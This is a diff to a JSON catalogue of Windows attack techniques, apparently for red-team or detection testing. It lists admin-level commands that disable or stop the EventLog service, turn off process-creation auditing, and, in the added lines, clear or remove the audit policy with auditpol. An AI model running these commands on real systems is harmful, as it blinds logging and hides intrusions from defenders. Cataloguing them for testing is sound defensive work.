@@ -10,7 +10,9 @@
       { "Attack-ID": "25", "Sub-Attack-ID": "006", "Type-Attack": "B <b>(Disable Service)</b>", "Privilege": "a", "Need Reboot": "y", "Attack": "New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\" -Name start -Value 4 -Force" ,"Comment": "4=Disabled,3=Manual,2=Automatic. Reboot not required if this attack is followed by <i>C</i>" },
       { "Attack-ID": "25", "Sub-Attack-ID": "007", "Type-Attack": "B <b>(Disable Service)</b>", "Privilege": "a", "Need Reboot": "y", "Attack": "sc config eventlog start=disabled" ,"Comment": "Reboot not required if this attack is followed by <i>C</i>" },
       { "Attack-ID": "25", "Sub-Attack-ID": "008", "Type-Attack": "C <b>(Stop Service)</b>", "Privilege": "a", "Need Reboot": "n", "Attack": "Stop-Service -Name EventLog -Force" ,"Comment": "Cannot works if Service is enable. Need to launch command <i>ATT-25-003</i> before this action" },
-      { "Attack-ID": "25", "Sub-Attack-ID": "009", "Type-Attack": "D <b>(Modification EventLog Policy)</b>", "Privilege": "a", "Need Reboot": "n", "Attack": "Auditpol.exe /set /subcategory:\"Process Creation\" /success:Disable /failure:Disable" ,"Comment": "Cannot works if Service is enable. Need to launch command <i>ATT-25-003</i> before this action" }
+      { "Attack-ID": "25", "Sub-Attack-ID": "009", "Type-Attack": "D <b>(Modification EventLog Policy)</b>", "Privilege": "a", "Need Reboot": "n", "Attack": "auditpol.exe /set /subcategory:\"Process Creation\" /success:Disable /failure:Disable" ,"Comment": "Cannot works if Service is enable. Need to launch command <i>ATT-25-003</i> before this action" },
+      { "Attack-ID": "25", "Sub-Attack-ID": "010", "Type-Attack": "D <b>(Modification EventLog Policy)</b>", "Privilege": "a", "Need Reboot": "n", "Attack": "auditpol.exe /clear /y" ,"Comment": "" },
+      { "Attack-ID": "25", "Sub-Attack-ID": "011", "Type-Attack": "D <b>(Modification EventLog Policy)</b>", "Privilege": "a", "Need Reboot": "n", "Attack": "auditpol.exe /remove /[user:Lucas|allusers]" ,"Comment": "" }
 
 
 
